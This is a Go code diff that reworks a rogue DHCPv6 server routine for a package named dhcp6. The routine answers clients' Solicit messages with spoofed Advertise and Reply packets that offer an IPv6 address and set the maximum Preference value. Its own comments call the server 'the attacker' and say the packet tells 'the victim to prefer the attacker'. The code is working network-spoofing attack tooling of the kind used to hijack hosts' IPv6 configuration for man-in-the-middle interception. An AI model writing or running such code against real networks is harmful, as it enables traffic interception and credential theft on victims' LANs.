@@ -3,7 +3,9 @@ package dhcp6
 import (
 	"fmt"
 	"net"
+	"time"
 	"github.com/insomniacslk/dhcp/dhcpv6"
+	"github.com/insomniacslk/dhcp/iana"
 	"golang.org/x/net/ipv6"
 )
 
@@ -59,7 +61,7 @@ func ListenDHCPv6(ifaceName string, macAddr string, offeredIP net.IP) error {
 		}
 
 		// Switch case base on the message type
-		switch dhcp.MsgType {
+		switch dhcp.MessageType {
 
 		case dhcpv6.MessageTypeSolicit:
 			// Sending Advertise
@@ -78,64 +80,75 @@ func ListenDHCPv6(ifaceName string, macAddr string, offeredIP net.IP) error {
 // Sending response (Advertise / Reply)
 func sendDHCPv6Response(conn net.PacketConn, addr net.Addr, dhcp *dhcpv6.Message, msgType dhcpv6.MessageType, offeredIP net.IP, macAddr string) {
 
-	// Advertise (msg-type, transaction-id, options), udp dst port 546
 	// options: (Client Identifier - DUID, server-identifer - DUID, Identity Association for Non-temporary Address (IA_NA))
 
-	// Extract DUID (inside the clientID)
-	var clientID []byte
+	// Get the client ID
+	clientIDOpt := dhcp.GetOneOption(dhcpv6.OptionClientID)
+
+	if clientIDOpt == nil {
+		return
+	}
 
 	// IAID must be unique among the identifiers for all of this client's IA_NAs (Need to be extracted)
-	var iaid []byte
+	ianaOpt := dhcp.GetOneOption(dhcpv6.OptionIANA)
 
-	for _, opt := range dhcp.Options {
-
-		if opt.Code == layers.DHCPv6OptClientID {
-			clientID = opt.Data
-		}
-
-		if opt.Code == layers.DHCPv6OptIANA {
-			iaid = opt.Data[:4]
-		}
-
+	if ianaOpt == nil {
+    	return
 	}
 
-	// Build the server DUID (in this case me - the attacker)
-	// DUID Based on Link-Layer Address Plus Time (DUID-LLT) -> combine timestamp + MAC address
+	optIANA, ok := ianaOpt.(*dhcpv6.OptIANA)
+	
+	if !ok {
+    	return
+	}
+
 	mac, _ := net.ParseMAC(macAddr)
-	serverDUID := append([]byte{
-		0x00, 0x01, // DUID type = 1 (LLT) -> 6 bits = 2 bytes 
-		0x00, 0x01, // Hardware type = Ethernet -> 16 bits = 2 bytes
-		0x00, 0x00, 0x00, 0x01,	// time (32 bit) -> variable = 6 bytes for Ethernet -> fixed for now (1 second)
-	}, mac...)
+	serverDUID := &dhcpv6.DUIDLLT{
+		HWType: iana.HWTypeEthernet,
+		LinkLayerAddr: mac,
+		Time: 1,
 
-
-	// building the dhcpv6 layer
-	dhcpv6 := layers.DHCPv6{
-		MsgType: msgType,
-		TransactionID: dhcp.TransactionID,
-
-		Options: layers.DHCPv6Options{
-
-			// client ID
-			layers.DHCPv6Option{
-				Code: layers.DHCPv6OptClientID,
-				Data: clientID,
-			},
-
-			// Server ID
-			layers.DHCPv6Option{
-				Code: layers.DHCPv6OptServerID,
-				Data: serverDUID,
-			},
-
-			// IA_NA (need: IAID, IA_Address (inside) -> )
-			layers.DHCPv6Option{
-				Code: layers.DHCPv6OptIANA,
-				// Data: ,
-			}
-
-		},
 	}
 
+	// building the response
+	resp := dhcpv6.Message{
+		MessageType: msgType,
+		TransactionID: dhcp.TransactionID,
+	}
+
+	// Adding the options to the response //
+
+	// Client-Identifier
+	resp.AddOption(clientIDOpt)
+
+	// server-Identifer
+	resp.AddOption(dhcpv6.OptServerID(serverDUID))
+
+	// IA_NA
+	resp.AddOption(&dhcpv6.OptIANA{
+		IaId: optIANA.IaId,
+		T1: 3600 * time.Second,
+		T2: 7200 * time.Second,
+		Options: dhcpv6.IdentityOptions{
+			Options: dhcpv6.Options{
+				&dhcpv6.OptIAAddress{
+					IPv6Addr: offeredIP,
+					PreferredLifetime: 3600 * time.Second,
+					ValidLifetime: 7200 * time.Second,
+				},
+			},
+		},
+	})
+
+	// Preference option -> Most important (tell the victim to prefer the attacker)
+	resp.AddOption(&dhcpv6.OptionGeneric{
+		OptionCode: dhcpv6.OptionPreference,
+		OptionData: []byte{255},
+	})
+
+	// serialize and send
+	bytes := resp.ToBytes()
+
+	conn.WriteTo(bytes, addr)
 
 }
